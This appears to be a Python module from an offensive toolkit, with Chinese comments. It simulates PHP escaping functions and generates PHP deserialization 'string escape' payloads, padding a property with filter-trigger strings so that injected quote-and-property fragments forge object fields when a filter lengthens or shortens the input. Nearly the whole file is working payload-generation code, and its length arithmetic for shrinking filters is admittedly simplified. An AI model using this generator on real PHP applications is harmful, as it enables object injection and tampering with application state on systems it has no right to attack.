class StringEscapeCalculator:
    """PHP 字符串逃逸长度计算器"""

    @staticmethod
    def addslashes(s: str) -> str:
        """模拟 PHP addslashes"""
        return s.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"').replace("\0", "\\0")

    @staticmethod
    def mysql_escape(s: str) -> str:
        """模拟 PHP mysql_real_escape_string (简化版)"""
        # 比 addslashes 多处理 \n, \r, \x1a
        s = StringEscapeCalculator.addslashes(s)
        return s.replace("\n", "\\n").replace("\r", "\\r").replace("\x1a", "\\Z")

    @staticmethod
    def calculate(original: str, method: str = "addslashes") -> dict:
        if method == "addslashes":
            escaped = StringEscapeCalculator.addslashes(original)
        else:
            escaped = StringEscapeCalculator.mysql_escape(original)
        
        return {
            "original_len": len(original),
            "escaped_len": len(escaped),
            "diff": len(escaped) - len(original),
            "escaped_str": escaped
        }

def generate_escape_payload(base_class_name, base_props, visibilities, escape_info, target_prop=None, target_value=None):
    """
    生成字符串逃逸 Payload (支持长度增加和减少)
    """
    from ..serializer.php import serialize_php
    
    search = escape_info['search']
    replace = escape_info['replace']
    delta = escape_info['delta']
    
    # 构造基础序列化串
    base_payload = serialize_php(base_class_name, base_props, visibilities)
    
    if delta > 0:
        # 长度增加场景 (如 addslashes)
        if not target_prop or not target_value:
            return base_payload
        inject_str = f'";s:{len(target_prop)}:"{target_prop}";s:{len(target_value)}:"{target_value}";}}'
        count = len(inject_str) // delta
        if len(inject_str) % delta != 0: count += 1
        padding = search * count
        carrier_prop = list(base_props.keys())[0] if base_props else 'data'
        base_props[carrier_prop] = padding + inject_str
        return serialize_php(base_class_name, base_props, visibilities)
    
    elif delta < 0:
        # 长度减少场景 (如 str_replace('hacker', 'admin'))
        abs_delta = abs(delta)
        carrier_prop = list(base_props.keys())[0] if base_props else 'data'
        
        # 构造注入片段：闭合当前字符串，定义新属性
        inject_part = f'";s:{len(target_prop)}:"{target_prop}";s:{len(target_value)}:"{target_value}";}}'
        
        # 计算需要填充的 search 字符串数量
        # 目标：让原始输入经过替换后，总长度正好等于基础 Payload 长度 + 注入部分长度
        # 这是一个线性方程，简化处理：我们直接在载体属性前插入足够多的 search
        count = len(inject_part) // abs_delta + 1
        padding = search * count
        
        # 将填充串和注入逻辑拼接到载体属性的值中
        original_val = str(base_props[carrier_prop])
        base_props[carrier_prop] = original_val + padding + inject_part
        return serialize_php(base_class_name, base_props, visibilities)
        
    return base_payload
